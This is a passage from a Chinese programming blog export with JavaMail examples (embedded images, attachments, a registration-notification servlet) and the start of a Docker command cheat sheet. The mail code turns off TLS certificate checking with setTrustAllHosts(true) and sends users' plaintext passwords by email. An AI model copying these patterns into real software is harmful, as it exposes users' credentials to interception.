class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;11927XXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;11927XXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;11927XXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;11927XXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;java发出&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        <span class="comment">//=================================准备图片数据=======================================</span></span><br><span class="line">        MimeBodyPart image=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        <span class="comment">//图片需要经过数据化的处理</span></span><br><span class="line">        DataHandler dh=<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\1594126632(1).jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//在part中放入这个处理过图片的数据</span></span><br><span class="line">        image.setDataHandler(dh);</span><br><span class="line">        <span class="comment">//给这个part设置一个ID名字</span></span><br><span class="line">        image.setContentID(<span class="string">&quot;bz.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//准备正文的数据</span></span><br><span class="line">        MimeBodyPart text=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        text.setContent(<span class="string">&quot;这是一张正文&lt;img src=&#x27;cid:bz.jpg&#x27;&gt;&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//描述数据关系</span></span><br><span class="line">        MimeMultipart mm=<span class="keyword">new</span> MimeMultipart();</span><br><span class="line">        mm.addBodyPart(text);</span><br><span class="line">        mm.addBodyPart(image);</span><br><span class="line">        mm.setSubType(<span class="string">&quot;related&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置到消息中，保存修改</span></span><br><span class="line">        message.setContent(mm);</span><br><span class="line">        message.saveChanges();</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="包含附件的发送"><a href="#包含附件的发送" class="headerlink" title="包含附件的发送"></a>包含附件的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.DataHandler;</span><br><span class="line"><span class="keyword">import</span> javax.activation.FileDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;1192XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;1192XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;1192XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;1192XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;java发出&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        <span class="comment">//=================================准备图片数据</span></span><br><span class="line">        MimeBodyPart image=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        <span class="comment">//图片需要经过数据化的处理</span></span><br><span class="line">        DataHandler dh=<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\1594126632(1).jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//在part中放入这个处理过图片的数据</span></span><br><span class="line">        image.setDataHandler(dh);</span><br><span class="line">        <span class="comment">//给这个part设置一个ID名字</span></span><br><span class="line">        image.setContentID(<span class="string">&quot;bz.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//=================================准备正文数据</span></span><br><span class="line">        MimeBodyPart text=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        text.setContent(<span class="string">&quot;这是一张正文&lt;img src=&#x27;cid:bz.jpg&#x27;&gt;&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//=================================准备附件数据</span></span><br><span class="line">        MimeBodyPart body1= <span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        body1.setDataHandler(<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\cmd.txt&quot;</span>)));</span><br><span class="line">        body1.setFileName(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//描述数据关系</span></span><br><span class="line">        MimeMultipart mm=<span class="keyword">new</span> MimeMultipart();</span><br><span class="line">        mm.addBodyPart(body1);</span><br><span class="line">        mm.addBodyPart(text);</span><br><span class="line">        mm.addBodyPart(image);</span><br><span class="line">        mm.setSubType(<span class="string">&quot;mixed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置到消息中，保存修改</span></span><br><span class="line">        message.setContent(mm);</span><br><span class="line">        message.saveChanges();</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实战：注册通知邮件"><a href="#实战：注册通知邮件" class="headerlink" title="实战：注册通知邮件"></a>实战：注册通知邮件</h2><h3 id="index-JSP"><a href="#index-JSP" class="headerlink" title="index.JSP"></a>index.JSP</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/RegisterServlet.do&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">            密码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;pwd&quot;</span>&gt;</span><br><span class="line">            邮箱：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;注册&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username, String password, String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绑定路径"><a href="#绑定路径" class="headerlink" title="绑定路径"></a>绑定路径</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.csn.MailDemo01.servlet.RegisterServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/RegisterServlet.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.pojo.User;</span><br><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.utils.Sendmail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegisterServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password=req.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">        String email=req.getParameter(<span class="string">&quot;email&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(username,password,email);</span><br><span class="line">        Sendmail send=<span class="keyword">new</span> Sendmail(user);</span><br><span class="line">        send.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="发送邮件核心类"><a href="#发送邮件核心类" class="headerlink" title="发送邮件核心类"></a>发送邮件核心类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sendmail</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String from=<span class="string">&quot;XXX@qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String host=<span class="string">&quot;smtp.qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Sendmail</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,host);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">            <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">            MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">            sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">            prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">            <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">            Session session= Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(from,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">            session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">            Transport ts=session.getTransport();</span><br><span class="line">            <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">            ts.connect(host,from,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">            <span class="comment">//注意需要传递session</span></span><br><span class="line">            MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">            <span class="comment">//指明邮件的发件人</span></span><br><span class="line">            message.setFrom(<span class="keyword">new</span> InternetAddress(from));</span><br><span class="line">            <span class="comment">//指明邮件的收件人</span></span><br><span class="line">            message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(user.getEmail()));</span><br><span class="line">            <span class="comment">//邮件标题</span></span><br><span class="line">            message.setSubject(<span class="string">&quot;注册通知&quot;</span>);</span><br><span class="line">            <span class="comment">//邮件的文本内容</span></span><br><span class="line">            message.setContent(<span class="string">&quot;恭喜你(&quot;</span>+user.getUsername()+<span class="string">&quot;)成功注册！&quot;</span>+<span class="string">&quot;密码：&quot;</span>+user.getPassword()</span><br><span class="line">                               ,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">//5.发送邮件</span></span><br><span class="line">            ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//6.关闭连接</span></span><br><span class="line">            ts.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里引入多线程的目的是为了提高用户的体验，防止因发送文件时间过长，导致前端响应过久，因此这里采用异步响应。</p>
]]></content>
      <tags>
        <tag>SMTP发送</tag>
        <tag>POP接收</tag>
        <tag>servlet</tag>
        <tag>代码发送邮件</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用入门文档</title>
    <url>/2023/06/25/docker%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<h2 id="Linux下的命令"><a href="#Linux下的命令" class="headerlink" title="Linux下的命令"></a>Linux下的命令</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 开、关docker-desktop（非必要，因为docker-desktop集成了docker服务）</span></span><br><span class="line">systemctl --user start docker-desktop	<span class="comment"># 启动docker-desktop</span></span><br><span class="line">systemctl --user <span class="built_in">enable</span> docker-desktop	<span class="comment"># 开启自动启动</span></span><br><span class="line">systemctl --user stop docker-desktop	<span class="comment"># 关闭docker-desktop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开、关docker（docker服务必须开启）</span></span><br><span class="line">systemctl start docker	<span class="comment"># 启动docker服务</span></span><br><span class="line">service docker start	<span class="comment"># 效果同上</span></span><br><span class="line">systemctl stop docker 	<span class="comment"># 停止docker服务</span></span><br><span class="line">service docker stop		<span class="comment"># 效果同上</span></span><br><span class="line">systemctl restart docker	<span class="comment"># 重启docker服务</span></span><br><span class="line">service docker restart		<span class="comment"># 效果同上</span></span><br><span class="line"><span class="comment"># docker服务状态</span></span><br><span class="line">systemctl status docker		<span class="comment"># 查看docker服务状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统日志</span></span><br><span class="line">journalctl -xe	<span class="comment"># 查看系统日志</span></span><br><span class="line">	<span class="comment"># -x 相关目录（如：问题相关的网址）</span></span><br><span class="line">	<span class="comment"># -e`从结尾开始看（默认从正序从开头看）</span></span><br><span class="line">	<span class="comment"># -r 倒序查看（默认从正序从开头看）</span></span><br></pre></td></tr></table></figure>

<h2 id="Window下的命令"><a href="#Window下的命令" class="headerlink" title="Window下的命令"></a>Window下的命令</h2><p>windows下的docker服务需要运行docker-desktop</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">wsl -l -v		<span class="comment"># 查看所有linux子系统的执行状态和版本</span></span><br></pre></td></tr></table></figure>

<h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.版本</span></span><br><span class="line">docker compose version</span><br><span class="line">docker --version</span><br><span class="line">docker version</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 2.镜像</span></span><br><span class="line">docker images	 <span class="comment"># 查看所有镜像文件</span></span><br><span class="line">docker images	-a 	<span class="comment"># 或者--all，显示所有镜像文件</span></span><br><span class="line">docker images	-q	<span class="comment"># 或者--quit，仅显示镜像id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.搜索</span></span><br><span class="line">docker search 镜像地址名称  [--filter=STARS=3000]   	<span class="comment"># 搜索镜像[搜索出来的镜像就是stars大于3000的]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.拉取</span></span><br><span class="line">docker pull镜像的仓库源[:tag]	   	<span class="comment"># 下载镜像（不指定tag时为latest版本）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.删除镜像</span></span><br><span class="line">docker rmi -f 镜像id          	 <span class="comment"># 删除指定的镜像</span></span><br><span class="line">docker rmi -f 镜像id 镜像id 镜像id    <span class="comment"># 删除多个镜像（空格分隔）</span></span><br><span class="line">docker rmi -f $(docker images -aq)    <span class="comment"># 删除全部的镜像</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 容器 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.创建、启动</span></span><br><span class="line">docker run [可选参数] 镜像id|镜像名[:tag] [<span class="built_in">command</span> [args]]		<span class="comment"># 选择一个镜像，先创建一个容器，再启动该容器（容器运行后可选择执行命令）		★启动的运行方式一经确定，便不可更改（守护模式还是交互模式只能在run时候确定（即使停止了重启也不会改变））</span></span><br><span class="line">	<span class="comment"># --name=&quot;名字&quot;		指定容器的名称</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># -d			 	 ★后台方式运行该容器（是守护模式，执行exit后，不会终止容器）（最后不要加上/bin/bash）,生成的守护程序是sshd-D（该程序通过docker attach连接时是不可以输入的）</span></span><br><span class="line">	<span class="comment"># -it			 	 ★使用交互方式运行，并创建一个伪终端，查看容器内容（是交互模式，执行exit后会终止容器）（此时命令最后最好加上/bin/bash），生成的程序是可以交互的bash（该程序通过docker attach连接时是可以输入的）</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># -p ip:主机端口:容器端口   		配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -p 主机端口:容器端口				配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -p 容器端口					   配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -P 				  大写P，随机分配一个主机的端口</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker run -d 镜像名		 <span class="comment"># 后台启动</span></span><br><span class="line">curl localhost:主机端口		<span class="comment"># 容器运行后，本机测试访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.退出</span></span><br><span class="line"><span class="built_in">exit</span>		<span class="comment"># 容器中有终端未关闭，则退出时仅关闭容器中的终端，不关闭容器；否则退出时，容器也将终止（如果当前是docker attach连接的终端，则退出的是初始终端，所以会将容器也终止）</span></span><br><span class="line">CTRL+P后CTRL+Q	<span class="comment"># 不关闭容器中的终端退出容器（容器中的终端不关闭，因此容器也不关闭），仅仅是断开与当前的终端的连接</span></span><br><span class="line">CTRL+D			<span class="comment"># 效果同 CTRL+P 后 CTRL+Q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.列表</span></span><br><span class="line">docker ps	<span class="comment"># 当前正在运行的容器</span></span><br><span class="line">	<span class="comment"># -a	# 所有容器的信息</span></span><br><span class="line">	<span class="comment"># -n=？ # 最近创建的n个容器（default -1）</span></span><br><span class="line">	<span class="comment"># -q	# 仅显示容器id</span></span><br><span class="line">	<span class="comment"># -s	# 总文件大小</span></span><br><span 